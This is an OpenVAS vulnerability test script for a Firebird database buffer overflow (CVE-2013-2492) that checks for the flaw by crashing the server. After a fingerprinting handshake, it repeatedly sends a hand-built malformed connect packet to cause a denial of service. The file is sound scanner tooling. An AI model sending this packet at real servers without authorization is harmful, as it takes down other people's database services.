###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_firebird_cnct_num_bof_vuln_win.nasl 9353 2018-04-06 07:14:20Z cfischer $
#
# Firebird Relational Database CNCT Group Number Buffer Overflow Vulnerability (Windows)
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to cause denial of
  service condition.
  Impact Level: Application";

tag_affected = "Firebird Server version 2.1.3 to 2.1.5 before 18514 and
  2.5.1 to 2.5.3 before 26623 on Windows";
tag_insight = "The flaw exists with a group number extracted from the CNCT information,
  which is sent by the client and whose size is not properly checked.";
tag_solution = "Upgrade Firebird to 2.1.5 Update 1, 2.5.2 Update 1, 2.5.3, 2.1.6 or later,
  For updates refer to http://www.firebirdsql.org";
tag_summary = "This host is running Firebird server and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803185");
  script_version("$Revision: 9353 $");
  script_cve_id("CVE-2013-2492");
  script_bugtraq_id(58393);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:14:20 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2013-03-25 15:25:55 +0530 (Mon, 25 Mar 2013)");
  script_name("Firebird Relational Database CNCT Group Number Buffer Overflow Vulnerability (Windows)");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52506");
  script_xref(name : "URL" , value : "http://tracker.firebirdsql.org/browse/CORE-4058");
  script_xref(name : "URL" , value : "https://gist.github.com/zeroSteiner/85daef257831d904479c");
  script_xref(name : "URL" , value : "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/misc/fb_cnct_group.rb");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("remote-detect-firebird.nasl", "os_detection.nasl");
  script_require_ports("Services/gds_db", 3050);
  script_mandatory_keys("Host/runs_windows");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}


include("host_details.inc");

## Variable Initialization
port = "";
soc = "";
resp = "";
data_req = "";
fb_aut_pkt = "";

## Get the default port
port = get_kb_item("Services/gds_db");
if(!port){
  port = 3050;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct the firebird Authentication request
fb_aut_pkt = raw_string(0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13,
                        0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x24,
                        0x00, 0x00, 0x00, 0x1c, 0x2f, 0x6f, 0x70, 0x74,
                        0x2f, 0x66, 0x69, 0x72, 0x65, 0x62, 0x69, 0x72,
                        0x64, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x6c, 0x65,
                        0x67, 0x69, 0x6f, 0x6e, 0x2e, 0x66, 0x64, 0x62,
                        0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x17,
                        0x01, 0x04, 0x72, 0x6f, 0x6f, 0x74, 0x04, 0x09,
                        0x63, 0x68, 0x72, 0x69, 0x73, 0x74, 0x69, 0x61,
                        0x6e, 0x05, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                        0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03,
                        0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x0a,
                        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02,
                        0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04);

send(socket:soc, data:fb_aut_pkt);
resp = recv(socket:soc, length:1024);
close(soc);

## Confirm the application
if(resp && strlen(resp) == 16 && "030000000a0000000100000003" >< hexstr(resp))
{

  ## Construct the malformed request
  data_req =  raw_string(0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13,
                         0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x24,
                         0x00, 0x00, 0x00, 0x10, 0x43, 0x3a, 0x5c, 0x74,
                         0x65, 0x73, 0x74, 0x5f, 0x66, 0x69, 0x72, 0x65,
                         0x62, 0x69, 0x72, 0x64, 0x00, 0x00, 0x00, 0x04,
                         0x00, 0x00, 0x00, 0x22, 0x05, 0x10, 0x41, 0x41,
                         0x41, 0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43,
                         0x43, 0x43, 0x44, 0x44, 0x44, 0x44, 0x05, 0x15,
                         0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73,
                         0x74, 0x2e, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x64,
                         0x6f, 0x6d, 0x61, 0x69, 0x6e, 0x06, 0x00, 0x00,
                         0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
                         0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
                         0x05, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
                         0x0a, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
                         0x02, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
                         0x04, 0xff, 0xff, 0x80, 0x0b, 0x00, 0x00, 0x00,
                         0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
                         0x05, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
                         0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
                         0x05, 0x00, 0x00, 0x00, 0x08, 0x00);

  ## Send malformed requests multiple times
  for(i=0;i<10; i++)
  {
    soc = open_sock_tcp(port);
    if(soc)
    {
     send(socket:soc, data:data_req);
     close(soc);
    }
    else
    {
      security_message(port);
      exit(0);
    }
  }
}
